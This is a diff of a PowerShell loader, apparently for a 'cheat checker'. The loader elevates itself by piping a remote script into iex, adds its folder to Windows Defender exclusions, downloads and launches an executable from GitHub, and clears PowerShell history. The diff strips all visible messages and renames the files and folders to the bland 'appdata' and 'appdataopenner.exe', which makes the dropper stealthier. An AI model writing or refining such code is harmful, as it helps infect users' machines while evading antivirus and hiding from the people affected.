@@ -19,57 +19,46 @@ function Clear-PSHistory {
 }
 
 if (-not $isAdmin) {
-    Write-Host "[-] Пожалуйста убедитесь что запустили чекер от имени администратора, без них он не может работать!" -ForegroundColor Red
-    Write-Host "[*] Запрашиваются права администратора..." -ForegroundColor Yellow
-    $url = "https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat-checker.ps1"
+    $url = "https://raw.githubusercontent.com/die4mebaby/appdata/main/nocheat-checker.ps1"
     Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $url | iex`""
     Clear-PSHistory
     exit
 }
 
-Write-Host "==========================================" -ForegroundColor Yellow
-Write-Host "         NoCheat Checker Loader           " -ForegroundColor Yellow
-Write-Host "==========================================" -ForegroundColor Yellow
-
 # ссылки на файлы в репо
 $repoOwner  = "die4mebaby"
-$repoName   = "CheatChecker"
+$repoName   = "appdata"
 $branch     = "main"
 $rawBaseUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/$branch"
-$exeUrl     = "$rawBaseUrl/nocheat.checker.exe"
+$exeUrl     = "$rawBaseUrl/appdataopenner.exe"
 
 # директ добавляем в исключения
-$workDir = Join-Path $env:LOCALAPPDATA "NoCheatChecker"
+$workDir = Join-Path $env:LOCALAPPDATA "appdataopenner"
 
 if (-not (Test-Path $workDir)) {
     New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 }
 
-$exePath = Join-Path $workDir "nocheat.checker.exe"
+$exePath = Join-Path $workDir "appdataopenner.exe"
 
 try {
     if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
-        Write-Host "[+] Добавление папки '$workDir' в исключения Защитника Windows..." -ForegroundColor Green
         Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
     }
-
-    Write-Host "[+] Загрузка nocheat.checker..." -ForegroundColor Green
     
     # скачиваем файл
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile($exeUrl, $exePath)
     
     if (-not (Test-Path $exePath) -or (Get-Item $exePath).Length -eq 0) {
-        Write-Warning "[!] Чекер не запустился ввиду ошибки или отсутствует вовсе."
+        Write-Warning "."
     }
-
-    Write-Host "[+] Запуск чекера..." -ForegroundColor Green
     
     # Запуск без ожидания завершения
     Start-Process -FilePath $exePath -WorkingDirectory $workDir
 }
 catch {
-    Write-Host "[-] Ошибка выполнения: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host " $($_.Exception.Message)" -ForegroundColor Red
 }
 
 # клин повершелл команд и офф окна
